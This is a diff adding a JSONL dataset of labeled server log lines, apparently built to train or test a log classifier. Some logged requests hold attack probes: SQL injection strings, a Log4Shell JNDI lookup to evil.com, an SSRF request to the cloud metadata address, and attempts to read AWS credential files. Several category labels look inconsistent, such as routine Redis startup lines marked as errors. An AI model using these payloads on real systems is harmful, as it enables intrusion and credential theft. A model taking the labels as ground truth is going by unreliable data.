@@ -1,0 +1,80 @@
+{"system": "auth_ssh", "raw_log": "Dec 10 09:30:10 srv-01 sshd[25050]: pam_unix(sshd:session): session closed for user ubuntu", "category": "noise"}
+{"system": "nginx", "raw_log": "2026/09/15 07:32:10 [error] 30#30: *20 open() \"/usr/share/nginx/html/.aws/credentials\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.aws/credentials HTTP/1.1\", host: \"127.0.0.1:8089\"", "category": "security"}
+{"system": "redis", "raw_log": "1:M 15 Sep 2026 07:32:31.457 * <search> gc: ON, prefix min length: 2, min word length to stem: 4, prefix max expansions: 200, query timeout (ms): 500, timeout policy: return, oom policy: return, cursor read size: 1000, cursor max idle (ms): 300000, max doctable size: 1000000, max number of search results:  1000000, default scorer: BM25STD,", "category": "error"}
+{"system": "nginx", "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"POST / HTTP/1.1\" 413 183 \"-\" \"Python-urllib/3.14\"", "category": "warning"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:23.107 UTC [213] STATEMENT:  SET statement_timeout = '10ms'; SELECT pg_sleep(0.5);", "category": "warning"}
+{"system": "auth_ssh", "raw_log": "Dec 10 07:26:15 srv-01 sshd[24290]: client_loop: send disconnect: Broken pipe", "category": "warning"}
+{"system": "auth_ssh", "raw_log": "Dec 10 07:18:20 srv-01 sshd[24250]: User admin from 198.51.100.44 not allowed because not listed in AllowUsers", "category": "security"}
+{"system": "nextjs_node", "raw_log": "[WARN] Node.js heap memory usage at 88.4% (1768MB / 2000MB limit)", "category": "error"}
+{"system": "kubernetes", "raw_log": "k8s event: [Warning] reason=Rebooted component=kubelet msg=\"Node sentria-cluster-control-plane has been rebooted, boot id: 83c626ff-44d7-4cd0-ad1e-bbc426902390\"", "category": "warning"}
+{"system": "nginx", "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v1/users?id=1%20OR%201=1 HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"", "category": "warning"}
+{"system": "postgresql", "raw_log": "initdb: warning: enabling \"trust\" authentication for local connections", "category": "warning"}
+{"system": "auth_ssh", "raw_log": "Dec 10 06:55:46 srv-01 sshd[24200]: Invalid user webmaster from 173.234.31.186 port 38926", "category": "security"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:28.267 UTC [356] FATAL:  role \"service_daemon\" does not exist", "category": "security"}
+{"system": "auth_ssh", "raw_log": "Dec 10 09:35:00 srv-01 sshd[25060]: Server listening on :: port 22.", "category": "noise"}
+{"system": "kubernetes", "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"registry.k8s.io/kube-apiserver:v1.36.1\" already present on machine and can be accessed by the pod\"", "category": "noise"}
+{"system": "nextjs_node", "raw_log": "Error: Failed to find Server Action \"f512c98a1\". This request might be from an older or newer deployment.", "category": "error"}
+{"system": "nginx", "raw_log": "2026/09/15 07:32:10 [error] 30#30: *31 open() \"/usr/share/nginx/html/api/v2/deprecated\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v2/deprecated HTTP/1.1\", host: \"127.0.0.1:8089\"", "category": "error"}
+{"system": "nginx", "raw_log": "/docker-entrypoint.sh: Configuration complete; ready for start up", "category": "noise"}
+{"system": "kubernetes", "raw_log": "k8s event: [Warning] reason=Unhealthy component=kubelet msg=\"Readiness probe failed: HTTP probe failed with statuscode: 503\"", "category": "warning"}
+{"system": "nginx", "raw_log": "2026/09/15 07:32:10 [error] 30#30: *21 open() \"/usr/share/nginx/html/api/v1/auth\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v1/auth?user=admin'-- HTTP/1.1\", host: \"127.0.0.1:8089\"", "category": "security"}
+{"system": "nginx", "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /assets/missing-style.css HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"", "category": "warning"}
+{"system": "auth_ssh", "raw_log": "Dec 10 07:08:22 srv-01 sshd[24214]: Connection reset by authenticating user root 45.142.214.12 port 50123 [preauth]", "category": "warning"}
+{"system": "nextjs_node", "raw_log": "(node:1234) [DEP0040] DeprecationWarning: The punycode module is deprecated. Please use a userland alternative instead.", "category": "warning"}
+{"system": "nextjs_node", "raw_log": "GET /api/v1/user/profile 200 OK 18.2ms", "category": "noise"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:28.768 UTC [370] FATAL:  role \"audit_test\" does not exist", "category": "security"}
+{"system": "nginx", "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v1/ping HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"", "category": "warning"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:27.825 UTC [341] FATAL:  role \"sql_user\" does not exist", "category": "security"}
+{"system": "kubernetes", "raw_log": "k8s event: [Normal] reason=RegisteredNode component=node-controller msg=\"Node sentria-cluster-control-plane event: Registered Node sentria-cluster-control-plane in Controller\"", "category": "noise"}
+{"system": "auth_ssh", "raw_log": "Dec 10 07:13:10 srv-01 sshd[24228]: error: maximum authentication attempts exceeded for invalid user oracle from 84.17.45.10 port 49120 ssh2 [preauth]", "category": "security"}
+{"system": "kubernetes", "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"registry.k8s.io/etcd:3.6.8-0\" already present on machine and can be accessed by the pod\"", "category": "noise"}
+{"system": "redis", "raw_log": "1:M 15 Sep 2026 07:32:39.319 * Background saving started by pid 158", "category": "warning"}
+{"system": "auth_ssh", "raw_log": "Dec 10 07:04:32 srv-01 sshd[24209]: Failed password for invalid user admin from 52.80.34.196 port 55102 ssh2", "category": "security"}
+{"system": "nextjs_node", "raw_log": "[WARN] LRU cache capacity reached 98% (49000/50000 entries), accelerating TTL eviction", "category": "warning"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:21.862 UTC [178] ERROR:  value too long for type character varying(4)", "category": "error"}
+{"system": "auth_ssh", "raw_log": "Dec 10 08:15:22 srv-01 sshd[25001]: Received disconnect from 192.168.1.50 port 51234:11: disconnected by user", "category": "noise"}
+{"system": "nginx", "raw_log": "2026/09/15 07:32:10 [error] 30#30: *26 open() \"/usr/share/nginx/html/proxy\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\", host: \"127.0.0.1:8089\"", "category": "security"}
+{"system": "redis", "raw_log": "1:M 15 Sep 2026 07:32:31.418 * Module 'bf' loaded from /usr/local/lib/redis/modules//redisbloom.so", "category": "error"}
+{"system": "redis", "raw_log": "1:M 15 Sep 2026 07:32:39.433 * Background saving terminated with success", "category": "warning"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:23.680 UTC [227] ERROR:  invalid input syntax for type uuid: \"invalid_uuid\" at character 8", "category": "error"}
+{"system": "nextjs_node", "raw_log": "[SECURITY] JWT signature validation failed for issuer https://auth.prod.internal: token expired at 1726308000", "category": "security"}
+{"system": "nextjs_node", "raw_log": "[SECURITY] CORS policy violation: Origin https://evil-site.com not allowed by Access-Control-Allow-Origin", "category": "security"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:20.183 UTC [129] ERROR:  division by zero", "category": "error"}
+{"system": "nextjs_node", "raw_log": "[SECURITY] Rate limit threshold reached for client IP 192.168.1.105 (429 Too Many Requests)", "category": "security"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:27.015 UTC [320] FATAL:  role \"guest\" does not exist", "category": "security"}
+{"system": "auth_ssh", "raw_log": "Dec 10 06:55:48 srv-01 sshd[24200]: Failed password for invalid user webmaster from 173.234.31.186 port 38926 ssh2", "category": "security"}
+{"system": "auth_ssh", "raw_log": "Dec 10 07:20:05 srv-01 sshd[24260]: Corrupted MAC on input. [preauth]", "category": "warning"}
+{"system": "nextjs_node", "raw_log": "[SECURITY] JsonWebTokenError: invalid signature on bearer token", "category": "security"}
+{"system": "redis", "raw_log": "1:M 15 Sep 2026 07:32:31.414 * Running mode=standalone, port=6379.", "category": "noise"}
+{"system": "redis", "raw_log": "1:M 15 Sep 2026 07:32:31.468 * <timeseries> Subscribe to ASM events", "category": "noise"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:21.623 UTC [171] ERROR:  function non_existent_function_call(integer, integer) does not exist at character 8", "category": "error"}
+{"system": "nextjs_node", "raw_log": "DatabaseError: Connection pool exhausted after 30000ms while acquiring client connection", "category": "error"}
+{"system": "nextjs_node", "raw_log": "[SECURITY] Brute force login threshold exceeded: 10 failed attempts for account admin@company.com", "category": "security"}
+{"system": "redis", "raw_log": "158:C 15 Sep 2026 07:32:39.321 * BGSAVE done, 0 keys saved, 0 keys skipped, 89 bytes written.", "category": "warning"}
+{"system": "nginx", "raw_log": "2026/09/15 07:32:10 [error] 30#30: *35 open() \"/usr/share/nginx/html/legacy/dashboard.html\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /legacy/dashboard.html HTTP/1.1\", host: \"127.0.0.1:8089\"", "category": "error"}
+{"system": "auth_ssh", "raw_log": "Dec 10 06:50:02 srv-01 sshd[24012]: error: open /dev/null failed: Permission denied", "category": "error"}
+{"system": "kubernetes", "raw_log": "k8s event: [Normal] reason=Started component=kubelet msg=\"Container started\"", "category": "noise"}
+{"system": "nextjs_node", "raw_log": "POST /api/v1/telemetry 204 No Content 5.4ms", "category": "noise"}
+{"system": "nginx", "raw_log": "2026/09/15 07:32:10 [error] 30#30: *23 open() \"/usr/share/nginx/html/search\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /search?q=${jndi:ldap://evil.com/a} HTTP/1.1\", host: \"127.0.0.1:8089\"", "category": "security"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:23.680 UTC [227] LOG:  statement: SELECT 'invalid_uuid'::uuid;", "category": "noise"}
+{"system": "nginx", "raw_log": "2026/09/15 07:32:10 [error] 30#30: *40 open() \"/usr/share/nginx/html/robots.txt\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /robots.txt HTTP/1.1\", host: \"127.0.0.1:8089\"", "category": "error"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:23.680 UTC [227] STATEMENT:  SELECT 'invalid_uuid'::uuid;", "category": "noise"}
+{"system": "auth_ssh", "raw_log": "Dec 10 06:50:03 srv-01 sshd[24013]: fatal: sshd: no hostkeys available -- exiting.", "category": "error"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:28.045 UTC [349] FATAL:  role \"attacker_ip\" does not exist", "category": "security"}
+{"system": "nginx", "raw_log": "2026/09/15 07:32:10 [error] 30#30: *28 open() \"/usr/share/nginx/html/missing-route-a\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /missing-route-a HTTP/1.1\", host: \"127.0.0.1:8089\"", "category": "error"}
+{"system": "nextjs_node", "raw_log": "[WARN] Slow query detected on table \"audit_logs\" taking 3450ms (threshold: 1000ms)", "category": "warning"}
+{"system": "postgresql", "raw_log": "2026-09-15 07:32:14.551 UTC [35] WARNING:  no usable system locales were found", "category": "warning"}
+{"system": "auth_ssh", "raw_log": "Dec 10 07:25:01 srv-01 sshd[24285]: kex_exchange_identification: client sent invalid protocol identifier \"\"", "category": "warning"}
+{"system": "auth_ssh", "raw_log": "Dec 10 06:50:00 srv-01 sshd[24010]: error: Could not get shadow information for NOUSER", "category": "error"}
+{"system": "redis", "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> RedisBloom version 8.10.1 (Git=unknown)", "category": "error"}
+{"system": "nginx", "raw_log": "/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh", "category": "noise"}
+{"system": "auth_ssh", "raw_log": "Dec 10 06:50:04 srv-01 sshd[24014]: error: PAM: Authentication failure for legal user testuser from 10.0.1.5", "category": "error"}
+{"system": "nextjs_node", "raw_log": "[WARN] Outgoing webhook delivery retry #3 for event order.created to https://client.api/hook", "category": "warning"}
+{"system": "kubernetes", "raw_log": "k8s event: [Warning] reason=BackOff component=kubelet msg=\"Back-off restarting failed container local-path-provisioner in pod local-path-provisioner-855c7b7774-wbj6b_local-path-storage(fd6328bf-2941-4296-8c41-55a19612fefa)\"", "category": "error"}
+{"system": "auth_ssh", "raw_log": "Dec 10 08:00:01 srv-01 sshd[25001]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)", "category": "noise"}
+{"system": "nextjs_node", "raw_log": "GET /static/chunks/main-app.js 200 OK 0.8ms", "category": "noise"}
+{"system": "nginx", "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.aws/credentials HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"", "category": "security"}
+{"system": "nginx", "raw_log": "/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration", "category": "noise"}
+{"system": "redis", "raw_log": "1:M 15 Sep 2026 07:32:31.468 * <timeseries> Subscribe to topology changes events", "category": "noise"}
+{"system": "postgresql", "raw_log": "sh: locale: not found", "category": "noise"}
+{"system": "nextjs_node", "raw_log": "(node:1234) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.", "category": "error"}
